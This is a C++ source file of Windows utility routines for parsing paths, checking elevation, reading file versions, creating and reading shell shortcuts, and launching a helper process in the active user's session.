
std::wstring GetPathFromString(std::wstring str)
{
	std::size_t begin = str.find_first_of('"');
	if (begin == std::wstring::npos)
	{
		return str;
	}
	std::size_t end = str.find('"',begin + 1);
	if (end == std::wstring::npos )
	{
		return str;
	}
	return str.substr(begin + 1, end-begin-1 );
}

std::wstring GetNameFromPath(std::wstring str)
{
	std::size_t begin = str.find_last_of('\\');
	if (begin == std::wstring::npos)
	{
		begin = -1;
	}
	std::size_t end = str.find_last_of('.');
	return str.substr(begin + 1, end-begin-1 );
}


std::wstring SplitFileName(std::wstring strFileName)
{
	int nPos = strFileName.length();
	for (int i = 0; i < strFileName.length(); i++)
	{
		if (strFileName[i] >= '0' && strFileName[i] <= '9')
		{
			nPos = i;
			break;
		}
	}
	std::wstring strRet = strFileName.substr(0, nPos);
	if (strRet == L"")
	{
		strRet = strFileName;
	}
	return strRet;
}

BOOL IsAdmin()
{
	BOOL bIsElevated = FALSE;  
	HANDLE hToken = NULL;  
	UINT16 uWinVer = LOWORD(GetVersion());  
	uWinVer = MAKEWORD(HIBYTE(uWinVer),LOBYTE(uWinVer));  

	if (uWinVer < 0x0600)//不是VISTA、Windows7  
		bIsElevated = TRUE; 

	if (OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken)) {  

		struct {  
			DWORD TokenIsElevated;  
		} /*TOKEN_ELEVATION*/te;  
		DWORD dwReturnLength = 0;  

		if (GetTokenInformation(hToken,/*TokenElevation*/(_TOKEN_INFORMATION_CLASS)20,&te,sizeof(te),&dwReturnLength)) {  
			if (dwReturnLength == sizeof(te))  
				bIsElevated = te.TokenIsElevated;  
		}  
		CloseHandle( hToken );  
	}   
	return bIsElevated;
}


unsigned __int64 GetFileVersion(const TCHAR* file_path, unsigned __int64 * VerionTimeStamp)
{
	if (FALSE == PathFileExists(file_path))
		return 0;
	unsigned __int64 i64Version = 0;
	VS_FIXEDFILEINFO *FileInfo = NULL;
	void *info = NULL;
	//	GetModuleFileName(_AtlBaseModule.GetModuleInstance(), m_strModulePath.c_str(), MAX_PATH);
	DWORD infosize = ::GetFileVersionInfoSize((TCHAR*)file_path, 0);
	info = malloc(infosize+4);
	if( NULL != info ) 
	{
		UINT   FileInfoSize;   
		if (FALSE != ::GetFileVersionInfo((TCHAR*)file_path,   0,   infosize,   info))
		{
			if (FALSE != ::VerQueryValue(info, _T("\\"), (void **)&FileInfo, &FileInfoSize))
			{
				i64Version = ((unsigned __int64)FileInfo->dwFileVersionMS << 32) | FileInfo->dwFileVersionLS;
				if (VerionTimeStamp)
				{
					WIN32_FILE_ATTRIBUTE_DATA attribute;
					if ( GetFileAttributesEx(file_path, GetFileExInfoStandard,	&attribute ) )
					{
						unsigned __int64 i64CreateTime = ((unsigned __int64)attribute.ftCreationTime.dwHighDateTime << 32) | attribute.ftCreationTime.dwLowDateTime;
						unsigned __int64 i64LastWriteTime = ((unsigned __int64)attribute.ftLastWriteTime.dwHighDateTime << 32) | attribute.ftLastWriteTime.dwLowDateTime;
						*VerionTimeStamp = (i64CreateTime>i64LastWriteTime) ? i64CreateTime : i64LastWriteTime;
						//						LOG4C_DEBUG( _T("%s's version timestamp is %I64u"), file_path, *VerionTimeStamp);
					}
				}
				//				LOG4C_DEBUG( _T("%s's version %u.%u.%u.%u"), file_path, HIWORD(FileInfo->dwFileVersionMS), LOWORD(FileInfo->dwFileVersionMS),
				//					HIWORD(FileInfo->dwFileVersionLS), LOWORD(FileInfo->dwFileVersionLS));
			}
			else
			{
				//LOG4C_WARN( _T("VerQueryValue(%s) 没有版本信息"), file_path);
			}
		}
		else
		{
			//LOG4C_WARN( _T("GetFileVersionInfo(%s) 没有版本信息"), file_path);
		}
		free(info);
	}   
	else     
	{   
		//LOG4C_WARN( _T("GetFileVersionInfoSize(%s) 没有版本信息"), file_path);
	}

	return i64Version;
}

int VerCmp(unsigned __int64 ver1, unsigned __int64 ver2)
{
	int result = 0;
	unsigned __int64 i64Ver1 = (ver1 >> 32) << 32 | LOWORD(ver1 & 0xffffffff);
	unsigned __int64 i64Ver2 = (ver2 >> 32) << 32 | LOWORD(ver2 & 0xffffffff);
	if ( i64Ver1 > i64Ver2 )
		result = 1;
	else if ( i64Ver1 < i64Ver2 )
		result = -1;

	return result;
}


BOOL CheckFileExist(std::wstring strFile)
{
	if (strFile[1] != ':')
	{
		strFile = ultra::ExpandEnvironment(strFile);
	}
	return PathFileExistsW(strFile.c_str());
}


std::wstring GetIEDir()
{
	std::wstring wstrPath = L"";
	TCHAR szPath[MAX_PATH] = {0};
	if (SHGetSpecialFolderPath(NULL, szPath, CSIDL_PROGRAM_FILES, 0))
	{
		wstrPath = szPath;
		std::size_t last = wstrPath.find_last_of(L"\\");
		if (last == std::wstring::npos)
		{
			return wstrPath;
		}
		if (last != wstrPath.length()-1)
		{
			wstrPath += L"\\";
		}
		wstrPath += L"Internet Explorer\\";
	}
	return wstrPath;
}

void PinShortCutLnk(const std::wstring &wstrOpera, const std::wstring &wstrPath)
{
	std::wstring wstrCmdLine = ultra::GetModuleFileNameW()+ L" -" + wstrOpera + L" " + wstrPath;
	// 进程信息
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(si);

	// 获得当前Session ID
	DWORD dwSessionID = WTSGetActiveConsoleSessionId();
	//OutputDebugStringA("WTSGetActiveConsoleSessionId ");
	HANDLE hToken = NULL;
	HANDLE hDuplicatedToken = NULL;
	LPVOID lpEnvironment = NULL;

	do 
	{
		// 获得当前Session的用户令牌
		if (WTSQueryUserToken(dwSessionID, &hToken) == FALSE)
		{
			break;
		}
		// 复制令牌
		if (DuplicateTokenEx(hToken,
			MAXIMUM_ALLOWED, NULL,
			SecurityIdentification, TokenPrimary,
			&hDuplicatedToken) == FALSE)
		{
			break;
		}

		// 创建用户Session环境
		if (CreateEnvironmentBlock(&lpEnvironment,
			hDuplicatedToken, FALSE) == FALSE)
		{
			break;
		}

		TCHAR tszCmdLine[MAX_PATH] = {0};
		_tcscpy(tszCmdLine, wstrCmdLine.c_str());

		// 在复制的用户Session下执行应用程序，创建进程。
		// 通过这个进程，就可以显示各种复杂的用户界面了
		if (CreateProcessAsUser(hDuplicatedToken, 
			NULL, tszCmdLine, NULL, NULL, FALSE,                    
			NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
			lpEnvironment, NULL, &si, &pi) == FALSE)
		{
			break;
		}

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

	} while (false);
	// 清理工作

	if (hToken != NULL)
		CloseHandle(hToken);
	if (hDuplicatedToken != NULL)
		CloseHandle(hDuplicatedToken);
	if (lpEnvironment != NULL)
		DestroyEnvironmentBlock(lpEnvironment);
}

bool Shell::CreateShortCutLink(
			   const std::wstring& display_name,
			   const std::wstring& src_path,
			   const std::wstring& work_path,
			   const std::wstring& dest_dir,
			   const std::wstring& link_arguments,
			   const std::wstring& description,
			   const std::wstring& icon_path)
{
	HRESULT hr;
	IShellLink* psl = NULL;
	IPersistFile* ppf = NULL;

	do {
	   hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&psl);
	   if (FAILED(hr)) {
		   break;
	   }
	   hr = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
	   if (FAILED(hr)) {
		   break;
	   }
	   hr = psl->SetPath(src_path.c_str());
	   if (FAILED(hr)) {
		   break;
	   }
	   std::wstring s = work_path;
	   if (s == L"")
	   {
		   s = ultra::GetUpperPath(src_path);
	   }
	   hr = psl->SetWorkingDirectory(s.c_str());
	   if (FAILED(hr)) {
		   break;
	   }
	   if (!link_arguments.empty()) {
		   hr = psl->SetArguments(link_arguments.c_str());
		   if (FAILED(hr)) {
			   break;
		   }
	   }
	   if (!description.empty()) {
		   hr = psl->SetDescription(description.c_str());
		   if (FAILED(hr)) {
			   break;
		   }
	   }
	   if (!icon_path.empty()) {
		   hr = psl->SetIconLocation(icon_path.c_str(), 0);
		   if (FAILED(hr)) {
			   break;
		   }
	   }
	   std::wstring save_path(dest_dir);
	   save_path = save_path + display_name + L".lnk";
	   hr = ppf->Save(save_path.c_str(), TRUE);
	} while (false);
	if (ppf != NULL) {
	   ppf->Release();
	}
	if (psl != NULL) {
	   psl->Release();
	}
	return SUCCEEDED(hr);
}

BOOL Shell::GetShortCutInfo(std::wstring strFileName, std::wstring& strTarget, std::wstring& strArguments, std::wstring& strWorkDirctory, std::wstring& strIconLocation)
{
	HRESULT hr;
	IShellLink* psl;
	IPersistFile* ppf;
	BOOL bRet = FALSE;
	//Create the ShellLink object

	do 
	{
		hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
			IID_IShellLink, (LPVOID*) &psl);
		if (FAILED(hr)) {
			break;
		}
		hr = psl->QueryInterface( IID_IPersistFile, (LPVOID *) &ppf);
		if (FAILED(hr))	{
			break;
		}
		hr = ppf->Load(strFileName.c_str(), 0);
		if (FAILED(hr))	{
			break;
		}
		WCHAR szBuffer[1024] = {0};
		//Read the target information from the link object
		//UNC paths are supported (SLGP_UNCPRIORITY)
		psl->GetPath(szBuffer, 1024, NULL, SLGP_UNCPRIORITY);
		strTarget = szBuffer;
		ZeroMemory(szBuffer, 1024);
		//Read the arguments from the link object
		psl->GetArguments(szBuffer, 1024);
		strArguments = szBuffer;
		psl->GetWorkingDirectory(szBuffer, 1024);
		strWorkDirctory = szBuffer;
		int* p = new int[1024];
		psl->GetIconLocation(szBuffer, 1024, p);
		strIconLocation = szBuffer;
		bRet = TRUE;
	} while (false);

	if (ppf != NULL) {
		ppf->Release();
	}
	if (psl != NULL) {
		psl->Release();
	}
	//Return the Target and the Argument as a CString
	return bRet;
}

